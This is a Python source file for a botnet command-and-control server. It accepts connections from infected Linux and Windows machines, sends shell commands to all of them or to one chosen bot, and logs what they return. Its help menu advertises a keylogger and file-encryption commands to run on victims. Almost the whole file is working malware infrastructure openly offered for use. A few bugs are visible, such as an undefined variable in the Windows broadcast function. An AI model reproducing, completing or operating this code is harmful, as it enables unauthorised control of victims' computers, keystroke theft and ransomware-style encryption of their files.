#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket # Import socket for creating TCP connection.
	from time import sleep # Import sleep from time to halt execution of program when necessary.
	from os import devnull, _exit, system # Import devnull for error, _exit for safe exit, system for clear screen.
	from sys import exit # Import exit from sys to quit program when specified.
	from threading import Thread # Import Timer to create threads for our functions.
	from queue import Queue # Import Queue to use queue data structure functions.
	import readline # Import readline to allow arrow key history navigation.
	from subprocess import run # Import run for executing system commands.
except ImportError as err:
	print(f'Import error: {err}')
	sleep(5)
	exit(1)
	
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS   #

PORT = 1337 # Port number to receve connections from.
IP = "172.17.0.1" # IP address of your computer. Change this!
NUM_OF_CONNECTIONS = 10 # Number of connections to accept.
NUM_OF_THREADS = 2 # Number of threads that we will create.
THREAD_IDS = [1, 2] # Thread identifiers.
BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
ENCODING = 'utf-8' # Encoding scheme.
DIRECTORY = './' # Directory to store target response files in.

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#   GLOBALS   #
WINDOWS_CONNS = {} # Dict containing Windows machines IP addresses and corresponding socket object.
LINUX_CONNS = {} # Dict containing Linux machines IP addresses and corresponding socket object.
WINDOWS_COUNT = 0 # Count for the number of Windows machines connected to our botnet.
LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet.
IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win machines. Seperate lists.

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#  ANSICOLORS  #
RESET = "\033[0m"
BOLD = "\033[01m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
PURPLE = "\033[95m"
ORANGE = "\033[33m"

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class Server:
	"""Socket server"""
	def __init__(self):
		pass

	def create_socket(self):
		"""This function will create a single server socket will create a socket
			and bind it to an IP and network interface.
			Arguments:
				None
			Returns:
				None
		"""
		self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server_socket.bind((IP, PORT))
		self.server_socket.listen(NUM_OF_CONNECTIONS)

	def accept_connections(self):
		"""
		"""
		global LINUX_CONNS
		global LINUX_COUNT
		global WINDOWS_CONNS
		global WINDOWS_COUNT

		LINUX_CONNS.clear()
		WINDOWS_CONNS.clear()

		while True:
			conn, addr = self.server_socket.accept()
			conn.setblocking(1)
			initial_response = conn.recv(COMMMAND_SIZE).decode('utf-8')
			if initial_response == 'Linux':
				LINUX_CONNS[addr[0]] = conn
				LINUX_COUNT += 1
				IP_ADDRESSES[0].append(addr[0])
			else:
				WINDOWS_CONNS[addr[0]] = conn
				WINDOWS_COUNT += 1
				IP_ADDRESSES[1].append(addr[0])

	def close(self):
		"""This function will close all active connections.
				Arguments:
					None
				Returns:
					None
		"""
		for ip, conn in LINUX_CONNS.items():
			conn.close()
		
		for ip, conn in WINDOWS_CONNS.items():
			conn.close()

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class BotnetCmdCtrl:
	"""Botnet class definition"""
	def __init__(self):
		self.server = Server() # Will instantiate and store a Server object.
		self.server_queue = Queue() # Will be used to perform next job in the queue.
		self.output_to_file = False # Will switch mode from only stdout to stdout and file stream.
		self.threads = [] # Will store the two threads created.
		global LINUX_COUNT
		global LINUX_CONNS
		global WINDOWS_COUNT
		global WINDOWS_COUNT
		global IP_ADDRESSES

	def handle_threads(self):
		"""This function will create two seperate threads.
		One will be used to accept incoming connections, and
		the other will be used to performing I/O between all
		of our connections.
			Arguments:
				None
			Returns:
				None
		"""
		for _ in range(NUM_OF_THREADS):
			t = Thread(target=self.command_and_control, daemon=True) # Create thread
			self.threads.append(t)
			t.start() # Start the thread

		
	def create_jobs(self):
		"""This function will create jobs and store them in a queue.
		The jobs will be executed by seperate threads.
			Arguments:
				None
			Returns:
				None
		"""
		for x in THREAD_IDS:
			self.server_queue.put(x) # Add element to the queue.
		self.server_queue.join() # Block main thread until worker threads have processes everything in queue.

	def get_command(self):
		"""This function gets a command from the user.
			Arguments:
				None
			Returns:
				The command that was provided by the user.
		"""
		cmd = input(GREEN + "[shell]$: " + RESET)
		while True:
			if cmd == 'quit':
				print(RED, "\nYou have closed all connections. Exiting program...", RESET)
				self.server.close()
				_exit(0)

			elif cmd.strip() == 'ls linux':
				if len(IP_ADDRESSES[0]) == 0:
					print(RED, 'Warning:', RESET, 'There are no Linux connections to list...')
				else:
					for ip in IP_ADDRESSES[0]:
						print(BLUE, IP_ADDRESSES[0].index(ip), RESET, ip)

			elif cmd.strip() == 'ls windows':
				if len(IP_ADDRESSES[1]) == 0:
					print(RED, 'Warning:', RESET, 'There are no Windows connections to list...')
				else:
					for ip in IP_ADDRESSES[1]:
						print(BLUE, IP_ADDRESSES[1].index(ip), RESET, ip)

			elif cmd.strip() == 'cnt linux':
				print(f'{PURPLE + str(LINUX_COUNT) + RESET} Linux targets.')

			elif cmd.strip() == 'cnt windows':
				print(f'{PURPLE + str(WINDOWS_COUNT) + RESET} Windows targets.')

			elif cmd[:3] == 'lin':
				resp_list = self.send_cmd_all_linux(cmd[4:])
				i = 0
				for output in resp_list:
					if i % 2 == 1 and self.output_to_file == False:
						print(output)
					elif i % 2 == 1 and self.output_to_file:
						print(output)
						self.write_response_output(output, resp_list[resp_list.index(output) - 1])
					else:
						print((RED + output + RESET + '\n').replace(' ', ''))
					i += 1

			elif cmd[:3] == 'win':
				resp_list = self.send_cmd_all_windows(cmd[4:])
				i = 0
				for output in resp_list:
					if i % 2 == 1 and self.output_to_file == False:
						print(output)
					elif i % 2 == 1 and self.output_to_file:
						print(output)
						self.write_response_output(output, resp_list[resp_list.index(output) - 1])
					else:
						print((RED + output + RESET + '\n').replace(' ', ''))
					i += 1

			elif cmd[:2] == 'sh': # Execute shell command on host machine.
				run(cmd[3:].split())

			elif cmd[:12] == 'select linux': # Select the Linux target to connect to.
				index = int(cmd[13:].strip())
				self.send_cmd_linux_target(index)

			elif cmd[:14] == 'select windows': # Select the Windows target to connect to.
				index = int(cmd[14:].strip())
				self.send_cmd_windows_target(int(index))

			elif cmd.strip() == 'switch': # Swithing writing modes: to stdout only, to stdout and file.
				self.output_to_file = not self.output_to_file

			elif cmd.strip() == 'check mode': # Check what write mode the program is in.
				if self.output_to_file:
					print(GREEN + 'Mode', RESET, '= write to stdout and file.')
				else:
					print(GREEN + 'Mode' + RESET + '= write to stdout.')

			elif cmd.strip() == 'clear':
				system('clear')

			elif cmd.strip() == 'help':
				self.help()

			else:
				print(RED + "Invalid command!" + RESET + " type" + GREEN + " 'help' " + RESET + "for help menu...", RESET)
		
			cmd = input(GREEN + "[shell]$: " + RESET)
	
	def send_cmd_all_linux(self, cmd: str):
		"""This function will send the command to all linux bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
			Returns:
				Will return the response generated by the executed command on the client machines operating on linux.
		"""
		response_list = []
		for ip, conn in LINUX_CONNS.items():
			conn.send(cmd.encode(ENCODING))
			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
			response = response[2:-1]
			response = response.replace('\\n', '\n')
			response_list.extend([ip, response])
		return response_list
			
	def send_cmd_all_windows(self, cmd: str):
		"""This function sends a command to all windows bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
		 	Returns:
				None
		"""
		response_list = []
		for conn in WINDOWS_CONNS.values():
			conn.send(cmd.encode(ENCODING))
			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
			response = response[2:-1]
			response = response.replace('\\n', '\n')
			response_list.extend([ip, response])
		return response_list
	
	def send_cmd_linux_target(self, ip_index: int):
		"""This function will send a command to a specific Linux machine.
			Arguments:
				ip_index (int): The index of the IP address the user wants to connect to.
			Returns:
				None
		"""
		try:
			target_ip = IP_ADDRESSES[0][ip_index]
		except IndexError:
			print(RED, 'Warning:', RESET, 'There are no Linux connections.')
			return
		except:
			print(RED, 'An error was thrown...', RESET)
			return

		conn = LINUX_CONNS[target_ip]
		while True:
			cmd = input(PURPLE + f'[shell][{target_ip}]$: ' + RESET)
			if cmd == 'back':
				break
			conn.send(cmd.encode(ENCODING))
			resp = conn.recv(BUFFER).decode(ENCODING)
			if resp == 'Invalid command...' or resp == 'Ok':
				print(RED + resp + RESET)
			else:
				resp = resp[2:-1]
				resp = resp.replace('\\n', '\n')
				print(resp)


	def send_cmd_windows_target(self, ip_index: int):
		"""This function will send a command to a specific Windows machine.
			Arguments:
				ip_index (int): The index of the IP address the user wants to connect to.
			Returns:
				None
		"""
		try:
			target_ip = IP_ADDRESSES[0][ip_index]
		except IndexError:
			print(RED, 'Warning:', RESET, 'There are no Windows connections.')
			return
		except:
			print(RED, 'An error was thrown...', RESET)
			return

		conn = WINDOWS_CONNS[target_ip]
		while True:
			cmd = input(PURPLE + f'[shell][{target_ip}]$: ' + RESET)
			if cmd == 'back':
				break
			conn.send(cmd.encode(ENCODING))
			resp = conn.recv(BUFFER).decode(ENCODING)
			if resp == 'Invalid command...' or resp == 'Ok':
				print(RED + resp + RESET)
			else:
				resp = resp[2:-1]
				resp = resp.replace('\\n', '\n')
				print(resp)

	def write_response_output(self, response: str, ip_addr: str):
		"""This function will write the response generated by each machine in the botnet 
		to a folder called "bots". The bots folder will contain files called by
		the IP addresses of each compromised machines.
		 	Arguments:
				response (str): The executed command response.
				ip_addr (str): The IP addresses of the current machine we are communicating with.
			Returns:
				None
		"""
		with open(DIRECTORY + ip_addr, 'a+') as botfile:
			botfile.write(response)
			
	def command_and_control(self):
		"""This function is running the operations for each (2) thread we create
		in the handle_threads function.
			Arguments:
				None
			Returns:
				None
		"""
		while True:
			x = self.server_queue.get()
			if x == 1:
				self.server.create_socket()
				self.server.accept_connections()
			if x == 2:
				self.get_command()
			self.server_queue.task_done()
				
	def help(self):
		"""This function will print the help menu.
			Arguments:
				None
			Returns:
				None
		"""
		print(PURPLE, 'Commands in main session: ', RESET)
		print(ORANGE, '  ls linux >', RESET, 'Lists all the Linux connections (IPs).')
		print(ORANGE, '  ls windows >', RESET, 'Lists all the Windows connections (IPs).')
		print(ORANGE, '  cnt linux >', RESET, 'Lists the amount of Linux connections (int).')
		print(ORANGE, '  cnt windows >', RESET, 'Lists the amount of Windows connections (int).')
		print(ORANGE, '  lin [command] >', RESET, 'Send command to all Linux machines.')
		print(ORANGE, '  win [command] >', RESET, 'Send command to all Windows machines.')
		print(ORANGE, '  select [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
		print(ORANGE, '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
		print(ORANGE, '  check mode >', RESET, 'Check write mode.')
		print(ORANGE, '  lin|win keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
		print(ORANGE, '  lin|win encrypt [path or file]->', RESET, 'Encrypt a file. Save the encryption key!')
		print(ORANGE, '  lin|win decrypt [path or file] [key]->', RESET, 'Decrypt a file.')
		print(ORANGE, '  clear >', RESET, 'Clear the screen.')
		print(ORANGE, '  quit >', RESET, "Quit the program.", end='\n\n')
		print(PURPLE, 'Commands when connected to target:', RESET)
		print(ORANGE, '  back >', RESET, 'Return to the main session.')
		print(RED, 'keylog and encrypt commands are also available during target connection.')

	def start(self):
		"""This function will initiate the program.
			Arguments:
				None
			Returns:
				None
		"""
		self.handle_threads() # Call functions to create threads
		self.create_jobs() # Call function to create jobs.

	def program_info(self):
		print("""
██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗ ██████╗   ██╗    ██████╗
██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝██╔════╝   ██║   ██╔════╝
██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   ██║     ████████╗██║     
██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   ██║     ██╔═██╔═╝██║     
██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   ╚██████╗██████║  ╚██████╗
╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═════╝   ╚═════╝

By: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
""")

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	botnetObj = BotnetCmdCtrl() # Instantiating socket object.
	botnetObj.program_info() # Prints the program name.
	botnetObj.start() # Initiate the program.

if __name__ == '__main__':
	server = Server()
	try:
		main()
	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
		print(RED, "\nExiting program...", RESET)
		server.close()
		sleep(0.75)
		run(['reset'])

